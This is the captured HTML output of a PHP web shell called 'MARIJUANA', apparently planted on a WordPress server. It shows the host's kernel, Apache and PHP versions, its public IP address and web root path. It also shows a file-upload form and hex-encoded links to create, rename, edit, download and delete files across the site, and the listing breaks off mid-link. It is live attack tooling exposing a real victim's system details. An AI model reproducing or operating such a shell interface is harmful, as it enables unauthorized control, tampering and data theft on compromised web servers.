<!DOCTYPE html>
	<html dir="auto" lang="en-US">

		<head>
			<meta charset="UTF-8">
			<meta name="robots" content="NOINDEX, NOFOLLOW">

				<title>MARIJUANA</title>

			<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
			<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">

			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
		</head>

		<body>
			<header>
				<div class="y x">
					<a class="ajx" href="download.php">
						MARIJuANA
					</a>
				</div>

				<div class="q x w">
					&#8212; DIOS &#8212; NO &#8212; CREA &#8212; NADA &#8212; EN &#8212; VANO &#8212;
				</div>
				
			</header>

			<article>
				<div class="i">
					<i class="far fa-hdd"></i>
					Linux AgroProd 4.15.0-171-generic #180-Ubuntu SMP Wed Mar 2 17:25:05 UTC 2022 x86_64
					<br />

					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> Apache/2.4.29 (Ubuntu) <b>PHP :</b> 7.4.25
					<br />

					<i class="far fa-folder"></i>
					
					<a class="ajx" href="?d=2f">/</a><a class="ajx" href="?d=2f766172">var</a>/<a class="ajx" href="?d=2f7661722f777777">www</a>/<a class="ajx" href="?d=2f7661722f7777772f70616d7064">pampd</a>/
					<br />

				</div>

				<div class="u">
					188.166.229.179 <i class="fas fa-link"></i>
					<br />

					<br />

					<form method="post" enctype="multipart/form-data">
						<label class="l w">
							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
						</label>&nbsp;
					</form>

					
				</div>
					<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th width="44%">[ NAME ]</th>
								<th width="11%">[ SIZE ]</th>
								<th width="17%">[ PERM ]</th>
								<th width="17%">[ DATE ]</th>
								<th width="11%">[ ACT ]</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td>
									<a class="ajx" href="?d=2f7661722f7777772f70616d7064&n">+FILE</a>
									<a class="ajx" href="?d=2f7661722f7777772f70616d7064&l">+DIR</a>
								</td>
							</tr>
						<tr class="r">
							<td>
								<i class="far fa-folder m"></i>
								<a class="ajx" href="?d=2f7661722f7777772f70616d70642f2e676974">.git</a>
							</td>
							<td class="x">
								dir
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&k=2e676974">drwxr-xr-x</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&t=2e676974">2021-12-04 17:54</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&r=2e676974">R</a>
								<a href="?d=2f7661722f7777772f70616d7064&x=2e676974">D</a>
							</td>
						</tr>
						
						<tr class="r">
							<td>
								<i class="far fa-folder m"></i>
								<a class="ajx" href="?d=2f7661722f7777772f70616d70642f617373657473">assets</a>
							</td>
							<td class="x">
								dir
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&k=617373657473">drwxr-xr-x</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&t=617373657473">2021-12-28 15:54</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&r=617373657473">R</a>
								<a href="?d=2f7661722f7777772f70616d7064&x=617373657473">D</a>
							</td>
						</tr>
						
						<tr class="r">
							<td>
								<i class="far fa-folder m"></i>
								<a class="ajx" href="?d=2f7661722f7777772f70616d70642f636f7265">core</a>
							</td>
							<td class="x">
								dir
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&k=636f7265">drwxr-xr-x</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&t=636f7265">2021-10-24 08:41</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&r=636f7265">R</a>
								<a href="?d=2f7661722f7777772f70616d7064&x=636f7265">D</a>
							</td>
						</tr>
						
						<tr class="r">
							<td>
								<i class="far fa-folder m"></i>
								<a class="ajx" href="?d=2f7661722f7777772f70616d70642f75706c6f616473">uploads</a>
							</td>
							<td class="x">
								dir
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&k=75706c6f616473">drwxr-xr-x</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&t=75706c6f616473">2021-10-24 08:33</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&r=75706c6f616473">R</a>
								<a href="?d=2f7661722f7777772f70616d7064&x=75706c6f616473">D</a>
							</td>
						</tr>
						
						<tr class="r">
							<td>
								<i class="far fa-folder m"></i>
								<a class="ajx" href="?d=2f7661722f7777772f70616d70642f77702d61646d696e">wp-admin</a>
							</td>
							<td class="x">
								dir
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&k=77702d61646d696e">drwxr-xr-x</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&t=77702d61646d696e">2022-04-07 22:04</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&r=77702d61646d696e">R</a>
								<a href="?d=2f7661722f7777772f70616d7064&x=77702d61646d696e">D</a>
							</td>
						</tr>
						
						<tr class="r">
							<td>
								<i class="far fa-folder m"></i>
								<a class="ajx" href="?d=2f7661722f7777772f70616d70642f77702d636f6e74656e74">wp-content</a>
							</td>
							<td class="x">
								dir
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&k=77702d636f6e74656e74">drwxr-xr-x</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&t=77702d636f6e74656e74">2022-04-07 22:04</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&r=77702d636f6e74656e74">R</a>
								<a href="?d=2f7661722f7777772f70616d7064&x=77702d636f6e74656e74">D</a>
							</td>
						</tr>
						
						<tr class="r">
							<td>
								<i class="far fa-file m"></i>&thinsp;
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&s=2e6874616363657373">.htaccess</a>
							</td>
							<td class="x">
								0.589 KB
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&k=2e6874616363657373">-rw-r--r--</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&t=2e6874616363657373">2021-10-24 08:33</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&r=2e6874616363657373">R</a>
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&e=2e6874616363657373">E</a>
								<a href="?d=2f7661722f7777772f70616d7064&g=2e6874616363657373">G</a>
								
								<a href="?d=2f7661722f7777772f70616d7064&x=2e6874616363657373">D</a>
							</td>
						</tr>
						
						<tr class="r">
							<td>
								<i class="far fa-file m"></i>&thinsp;
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&s=33696e6465782e706870">3index.php</a>
							</td>
							<td class="x">
								2.043 KB
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&k=33696e6465782e706870">-rw-r--r--</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&t=33696e6465782e706870">2022-04-07 22:04</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&r=33696e6465782e706870">R</a>
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&e=33696e6465782e706870">E</a>
								<a href="?d=2f7661722f7777772f70616d7064&g=33696e6465782e706870">G</a>
								
								<a href="?d=2f7661722f7777772f70616d7064&x=33696e6465782e706870">D</a>
							</td>
						</tr>
						
						<tr class="r">
							<td>
								<i class="far fa-file m"></i>&thinsp;
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&s=3430372e68746d6c">407.html</a>
							</td>
							<td class="x">
								1.108 KB
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&k=3430372e68746d6c">-rw-r--r--</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&t=3430372e68746d6c">2022-02-13 11:04</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&r=3430372e68746d6c">R</a>
								<a class="ajx" href="?d=2f7661722f7777772f70616d7064&e=3430372e68746d6c">E</a>
								<a href="?d=2f7661722f7777772f70616d7064&g=3430372e68746d6c">G</a>
								
								<a href="?d=2f7661722f777777